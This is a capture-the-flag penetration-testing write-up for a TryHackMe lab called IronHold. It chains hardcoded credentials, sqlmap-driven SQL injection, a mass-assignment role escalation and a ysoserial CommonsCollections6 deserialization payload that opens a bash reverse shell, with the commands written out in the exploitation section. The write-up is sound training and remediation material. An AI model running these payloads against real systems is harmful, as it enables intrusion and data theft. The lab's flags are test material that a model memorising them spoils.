# IronHold — Penetration Testing Writeup

## 1. Overview

| Field           | Details                                         |
| --------------- | ----------------------------------------------- |
| Platform        | TryHackMe                                       |
| Target          | IronHold                                        |
| Target IP       | `10.49.133.149`                                 |
| Difficulty      | To be confirmed                                 |
| Category        | Web Application Security / Java Deserialization |
| Assessment Date | November 14, 2026                               |
| Methodology     | PTES-inspired workflow                          |
| Status          | Completed                                       |

### Objective

Assess the security of the IronHold inmate-management application using its leaked source code and running instance. Identify weaknesses in authentication, database access, authorization, and deserialization, then determine how far an attacker could progress through the application and its underlying environment.

### Executive Summary

The assessment began with two exposed services: SSH on port 22 and an HTTP application on port 8080.

The leaked source code revealed hardcoded credentials shared by multiple staff accounts. These credentials allowed initial access to the application as an officer account.

Further investigation identified several security weaknesses:

- Hardcoded staff credentials allowed unauthorized application access.
- SQL injection in the inmate search functionality exposed sensitive database records.
- Mass assignment in the profile update functionality allowed modification of the user's role from `OFFICER` to `WARDEN`.
- An unsafe Java deserialization endpoint was exploitable through a Commons Collections gadget chain, resulting in remote code execution.

The final exploitation step provided a reverse shell as `appuser` inside the application container, allowing retrieval of the fourth flag.

**Assessment outcome:** Four flags were recovered, and remote command execution inside the application container was confirmed.

## 2. Scope and Environment

- **Target IP:** `10.49.133.149`
- **Application URL:** `http://10.49.133.149:8080`
- **Attacker environment:** Kali Linux
- **Tools used:**
  - RustScan
  - Nmap
  - Burp Suite
  - cURL
  - sqlmap
  - Java
  - ysoserial
  - Netcat / Ncat
  - Linux command-line utilities
- **Source code:** Full application repository supplied by the room.
- **Scope:** The IronHold application and services exposed by the assigned TryHackMe target.
- **Authorization:** Authorized TryHackMe training environment.

## 3. Reconnaissance

### 3.1 Port scanning

RustScan was used to identify open TCP ports.

**Command:**

```bash
rustscan -a 10.49.133.149
```

**Confirmed results:**

| Port     | State | Service                                  |
| -------- | ----- | ---------------------------------------- |
| 22/TCP   | Open  | SSH                                      |
| 8080/TCP | Open  | HTTP proxy (Nmap service identification) |

RustScan also initiated Nmap scanning against the discovered ports.

**Analysis:**

Port 8080 was the primary web application attack surface. Port 22 indicated that SSH was also exposed, although no SSH credentials had been established at this stage.

### 3.2 Source code review

The room provided a complete application source repository. Rather than relying exclusively on external enumeration, I reviewed the source code to identify potentially insecure application logic and hardcoded configuration.

The following file was inspected:

```bash
cat src/main/java/com/ironhold/seed/DataSeeder.java
```

The `seedStaff()` method contained the following logic:

```java
String fillerHash = passwordEncoder.encode("IronholdStaff2026!");

String[][] officers = {
    {"j.reyes", "Officer J. Reyes", "O-104"},
    {"m.chen", "Officer M. Chen", "O-118"},
    {"a.osei", "Officer A. Osei", "O-129"},
    {"l.bianchi", "Officer L. Bianchi", "O-142"}
};

for (String[] o : officers) {
    Staff officer = new Staff();
    officer.setUsername(o[0]);
    officer.setPassword(fillerHash);
    officer.setFullName(o[1]);
    officer.setEmail(o[0] + "@ironhold.example");
    officer.setBadgeNumber(o[2]);
    officer.setRole("OFFICER");
    all.add(staffRepository.save(officer));
}
```

**Finding:** Multiple officer accounts were initialized using the same hardcoded password.

This provided a potential initial access path that could be validated against the running application.

## 4. Enumeration and Initial Access

### 4.1 Hardcoded staff credentials

Based on the source code, I attempted to authenticate using the `l.bianchi` officer account and the shared password identified in the seeder.

The login was successful.

The dashboard identified the authenticated account as Officer L. Bianchi.

A request to the dashboard was also tested using cURL:

```bash
curl -X GET "http://10.49.133.149:8080/dashboard" \
  -H "Cookie: JSESSIONID=<REDACTED>"
```

The response confirmed:

- Authenticated username: `l.bianchi`
- Displayed name: Officer L. Bianchi
- Displayed role: `WARDEN`
- Accessible application sections, including the admin panel.

The dashboard also contained a shift-handover notice with the first flag.

**Flag 1:**

```text
THM{k10sk_c0ns0l3_unl0ck3d}
```

**Security impact:** Reusing hardcoded credentials across staff accounts allows an attacker who discovers the shared password to access multiple accounts without compromising each password individually.

## 5. Vulnerability Analysis

### Finding 1 — Hardcoded and Shared Staff Credentials

- **Affected component:** Staff account initialization in `DataSeeder.java`
- **Vulnerability class:** CWE-798 — Use of Hard-coded Credentials
- **Evidence:** The seeder assigned a common encoded password to multiple officer accounts.
- **Validation:** Successful login as `l.bianchi` using the shared password.

**Impact:**

An attacker with access to the leaked source code could identify the shared credential and attempt authentication against the live application.

**Recommended remediation:**

- Remove hardcoded credentials from source code.
- Require unique credentials for each staff account.
- Force password changes for default or seeded accounts.
- Store secrets securely outside the source repository.
- Review repository history for previously exposed secrets.

### Finding 2 — SQL Injection in Inmate Search

- **Affected endpoint:** `/inmates/search`
- **Parameter:** `q`
- **Vulnerability class:** CWE-89 — Improper Neutralization of Special Elements Used in an SQL Command

**Initial investigation:**

The inmate search functionality was discovered through the authenticated application.

The following request was tested:

```bash
curl -X GET \
"http://10.49.133.149:8080/inmates/search?q='" \
-H "Cookie: JSESSIONID=<REDACTED>"
```

The application returned:

```http
HTTP/1.1 500 Internal Server Error
```

This response indicated an application error when processing the supplied input. By itself, the error was not sufficient to establish SQL injection, so further validation was performed.

**SQL injection validation:**

sqlmap was used to investigate the search parameter and retrieve the `case_files` table.

```bash
sqlmap -u \
"http://10.49.133.149:8080/inmates/search?q=a" \
--cookie="JSESSIONID=<REDACTED>" \
--search -T case_files
```

**Confirmed database result:**

| Column      | Retrieved value         |
| ----------- | ----------------------- |
| ID          | 1                       |
| TITLE       | Internal Affairs Review |
| SUMMARY     | Flag value              |
| STATUS      | OPEN                    |
| CASE_NUMBER | IA-2024-007             |

The `SUMMARY` column contained the second flag.

**Flag 2:**

```text
THM{c4s3_f1l3_pull3d_via_uni0n}
```

**Source code correlation:**

The source code contained the following seed logic:

```java
private void seedCaseFile() {
    jdbcTemplate.update(
        "INSERT INTO case_files (case_number, title, summary, status, opened_at) VALUES (?, ?, ?, ?, ?)",
        "IA-2024-007", "Internal Affairs Review", flag2, "OPEN",
        LocalDateTime.now().minusMonths(3));
}
```

This confirmed that the flag was stored in the `case_files` table's `summary` field.

**Impact:**

SQL injection allowed retrieval of database information outside the intended inmate search results, exposing sensitive internal records.

**Recommended remediation:**

- Use parameterized queries and prepared statements.
- Avoid constructing SQL queries through string concatenation.
- Validate and constrain user input.
- Apply least-privilege database permissions.
- Implement safe error handling that does not expose internal database details.

### Finding 3 — Mass Assignment / Improper Role Authorization

- **Affected endpoint:** `/profile/update`
- **Vulnerability class:** CWE-915 — Improperly Controlled Modification of Dynamically-Determined Object Attributes

**Initial observation:**

The profile update functionality accepted parameters such as:

- `fullName`
- `email`
- `badgeNumber`

The request was intercepted and modified using Burp Suite.

An additional `role` parameter was supplied:

```text
role=WARDEN
```

The modified request was submitted to the profile update endpoint.

The server returned:

```http
HTTP/1.1 302
Location: http://10.49.133.149:8080/profile
```

The redirect alone did not establish successful privilege escalation. The resulting account role was then verified through subsequent application access.

**Validation:**

A request was made to the administrative endpoint:

```bash
curl -X GET \
"http://10.49.133.149:8080/admin/control" \
-H "Cookie: JSESSIONID=<REDACTED>"
```

The returned page displayed:

```text
Cellblock Door Control

Warden clearance required.
```

The page also showed the authenticated account with the `WARDEN` role and exposed the facility master override flag.

**Flag 3:**

```text
THM{w4rd3n_b4dg3_f0rg3d}
```

**Impact:**

An officer account could modify its own role through the profile update functionality, bypassing the intended authorization hierarchy and accessing warden-restricted functionality.

**Recommended remediation:**

- Never allow users to modify their own authorization role through ordinary profile updates.
- Use explicit request DTOs containing only permitted profile fields.
- Enforce authorization checks on the server for every privileged action.
- Apply role changes through a separate administrative workflow.
- Record and monitor changes to privileged account attributes.

## 6. Exploitation

### 6.1 Dependency identification

After retrieving the third flag, I returned to the source code to investigate the remaining attack surface.

The project dependency configuration was inspected:

```bash
grep -ri "version" ./
```

The `pom.xml` contained the following version constraint:

```xml
<version>[3.2,3.2.2)</version>
```

This indicated a dependency range starting at version 3.2 and excluding version 3.2.2.

The range was associated with an outdated Apache Commons Collections dependency.

**Security significance:**

Certain Commons Collections versions contain gadget classes that can be abused during unsafe Java object deserialization. ysoserial provides payload generators for testing known Java deserialization gadget chains.

The source review also identified an import functionality that accepted serialized data.

### 6.2 Java deserialization exploitation

The `ysoserial` project was used to generate a Commons Collections 6 payload.

Tool reference:

- [ysoserial — GitHub](https://github.com/frohoff/ysoserial)

The reverse-shell listener was started on the attacker machine:

```bash
nc -lvnp 4444
```

A Bash reverse-shell command was Base64-encoded and used as the command executed by the generated payload.

The payload generation and submission were performed as follows:

```bash
payload=$(
  java --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar \
  CommonsCollections6 \
  "bash -c {echo,<BASE64_REVERSE_SHELL_COMMAND>}|{base64,-d}|{bash,-i}" \
  | base64 -w0
)

curl -b 'JSESSIONID=<REDACTED>' \
  -H 'Content-Type: text/plain' \
  http://10.49.133.149:8080/admin/import \
  -d "$payload"
```

The application returned:

```text
Batch accepted: HashSet
```

The response indicated that the batch was accepted. The reverse-shell connection received by the listener provided confirmation that the payload had executed.

### 6.3 Reverse shell confirmation

The listener received a connection from:

```text
10.49.151.194
```

The shell displayed:

```text
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
appuser@f62a3262ffed:/app$
```

The current directory contained:

```text
app.jar
docker-entrypoint.sh
```

The shell identity was `appuser`.

**Confirmed result:** Remote command execution was obtained inside the application container.

### 6.4 Retrieving the fourth flag

The application entrypoint script was inspected:

```bash
cat docker-entrypoint.sh
```

Relevant lines:

```bash
mkdir -p /opt/ironhold
umask 077

[ -f /opt/ironhold/flag.txt ] && chmod 600 /opt/ironhold/flag.txt

printf '%s\n' "${FLAG4:?FLAG4 environment variable must be set}" \
  > /opt/ironhold/flag.txt

chmod 400 /opt/ironhold/flag.txt

unset FLAG4

exec java -jar /app/app.jar
```

The script showed that the fourth flag was written from the `FLAG4` environment variable into `/opt/ironhold/flag.txt` during application startup.

The file was read from the reverse shell:

```bash
cat /opt/ironhold/flag.txt
```

**Flag 4:**

```text
THM{0v3r_th3_w4ll_4nd_g0n3}
```

**Outcome:** The final flag was retrieved through command execution inside the application container.

## 7. Attack Chain Summary

```text
Leaked Application Source Code
           |
           v
Hardcoded Shared Officer Credentials
           |
           v
Initial Access as l.bianchi
           |
           v
Flag 1 — Dashboard Notice
           |
           v
SQL Injection in /inmates/search
           |
           v
Sensitive case_files Database Record
           |
           v
Flag 2 — Internal Affairs Record
           |
           v
Mass Assignment in /profile/update
           |
           v
Role Changed from OFFICER to WARDEN
           |
           v
Unauthorized Access to /admin/control
           |
           v
Flag 3 — Facility Override Code
           |
           v
Outdated Commons Collections Dependency
           |
           v
Unsafe Deserialization in /admin/import
           |
           v
CommonsCollections6 Payload
           |
           v
Remote Command Execution
           |
           v
Reverse Shell as appuser
           |
           v
Flag 4 — Container Flag
```

## 8. Remediation Summary

| Finding                            | Recommended priority | Remediation                                                            |
| ---------------------------------- | -------------------- | ---------------------------------------------------------------------- |
| Hardcoded/shared staff credentials | High                 | Remove hardcoded credentials and require unique passwords              |
| SQL injection                      | Critical             | Use parameterized database queries                                     |
| Mass assignment                    | Critical             | Restrict updateable fields and enforce server-side authorization       |
| Unsafe Java deserialization        | Critical             | Avoid deserializing untrusted data and replace vulnerable dependencies |

These are preliminary risk priorities based on the demonstrated attack paths, not formal CVSS scores.

### Additional security recommendations

- Keep third-party dependencies updated and monitor vulnerability advisories.
- Review dependency ranges in `pom.xml` and use controlled dependency versions.
- Restrict administrative endpoints to explicitly authorized roles.
- Protect session cookies with appropriate security attributes.
- Monitor unusual administrative role changes and application import operations.
- Treat source-code repository exposure as a security incident and rotate any exposed secrets.

## 9. Lessons Learned

- Reviewing leaked source code can reveal security weaknesses that are not immediately apparent from the running application.
- Shared credentials can turn source-code exposure into direct application access.
- SQL injection can expose sensitive database records beyond the intended functionality of a search feature.
- Mass assignment can allow unauthorized modification of security-sensitive attributes, including user roles.
- Authorization must be enforced on the server, not merely through the application's interface.
- Vulnerable Java libraries can introduce dangerous deserialization gadget chains.
- A successful deserialization exploit can lead to remote command execution when untrusted serialized objects are processed unsafely.
- Application container access does not automatically imply host-level compromise; the execution context must be documented accurately.

## 10. References

- [Penetration Testing Execution Standard (PTES)](http://www.pentest-standard.org/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [ysoserial — GitHub](https://github.com/frohoff/ysoserial)
- [Apache Commons Collections](https://commons.apache.org/proper/commons-collections/)

## 11. Evidence Index

| Evidence ID | Description                                | Suggested filename               |
| ----------- | ------------------------------------------ | -------------------------------- |
| E-01        | RustScan results                           | `E-01-port-scan.txt`             |
| E-02        | DataSeeder source-code finding             | `E-02-hardcoded-credentials.png` |
| E-03        | Successful dashboard access and first flag | `E-03-initial-access.png`        |
| E-04        | SQL injection error response               | `E-04-sqli-error.png`            |
| E-05        | sqlmap case_files result                   | `E-05-case-files-dump.txt`       |
| E-06        | Modified profile request                   | `E-06-mass-assignment.png`       |
| E-07        | Warden dashboard and third flag            | `E-07-warden-access.png`         |
| E-08        | Dependency version evidence                | `E-08-pom-dependency.png`        |
| E-09        | Reverse shell connection                   | `E-09-reverse-shell.png`         |
| E-10        | Fourth flag retrieval                      | `E-10-final-flag.png`            |

---

**Disclaimer:** This writeup documents exploitation performed within an authorized TryHackMe training environment. Credentials, session identifiers, and other reusable secrets have been redacted from the public report.
